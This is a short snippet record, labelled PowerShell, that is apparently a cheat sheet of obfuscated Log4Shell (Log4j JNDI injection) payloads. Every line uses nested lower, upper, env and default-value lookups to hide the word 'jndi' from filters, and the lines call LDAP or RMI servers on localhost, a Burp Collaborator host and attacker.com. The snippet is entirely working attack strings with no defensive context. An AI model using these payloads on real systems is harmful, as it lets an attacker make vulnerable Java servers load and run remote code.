---
id: 78ca9db1-0f05-473b-b9b1-21c6c6f5b7eb
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:56.914711+00:00'
updated_at: '2023-04-06T03:55:56.917836+00:00'
---

# Code Snippet 78ca9db1

**Language**: Powershell

```powershell
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a}

# using lower and upper
${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc}
${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}

# using env to create the letter
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
```


